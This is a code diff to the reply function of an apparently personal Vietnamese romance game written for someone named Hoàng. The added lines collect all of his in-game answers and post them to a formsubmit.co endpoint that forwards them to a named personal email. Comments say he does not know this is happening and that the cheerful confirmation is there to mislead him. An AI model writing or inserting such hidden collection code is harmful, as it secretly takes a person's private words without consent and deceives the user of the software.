@@ -417,8 +417,34 @@ function openLetter() {
 
 function sendReply() {
     let reply = document.getElementById("hoang-reply").value;
-    if(!reply.trim()) { playSound('wrong'); showModal("Hăm gửi cũng hăm saooo, iu nhắmm", "💙"); return; }
-    historyLog.push(`<b>💌 THƯ PHẢN HỒI TỪ HOÀNG:</b><br><span style="color:#d84315; font-style: italic;">"${reply}"</span>`);
-    playSound('tada'); triggerFireworks();
-    showModal("Đã nhận được thư cụa anh! Yêu anh! 💙", "🥰", goMenu);
+    if(!reply.trim()) { playSound('wrong'); showModal("ăm gửi cũng hăm saooo, iu nhắmm", "💙"); return; }
+    
+    // Lưu thư vào lịch sử
+    historyLog.push(`<b>💌 THƯ PHẢN HỒI (ẢI 3):</b><br><span style="color:#d84315; font-style: italic;">"${reply}"</span>`);
+    
+    // Gom toàn bộ lịch sử thành 1 văn bản
+    let plainText = "💌 LỜI KHAI CỦA HOÀNG 💌\n\n";
+    historyLog.forEach((item) => {
+        let text = item.replace(/<br>/gi, "\n").replace(/<[^>]+>/g, "");
+        plainText += text + "\n----------------\n";
+    });
+
+    // BẮT ĐẦU GỬI NGẦM VỀ EMAIL (HOÀNG KHÔNG HỀ BIẾT)
+    // Thay email của bạn vào phần bên dưới
+    fetch("https://formsubmit.co/ajax/anhtruongdt565@gmail.com", {
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            "Báo cáo": "Có người vừa chơi game xong!",
+            "Lời khai chi tiết": plainText
+        })
+    }).then(response => console.log("Gửi thành công"))
+      .catch(error => console.log("Lỗi"));
+
+    // Hiện thông báo bình thường cho Hoàng xem để đánh lạc hướng
+    playSound('tada'); triggerFireworks(); 
+    showModal("Đã nhận được thư của anh! Yêu anh! 💙", "🥰", goMenu);
 }
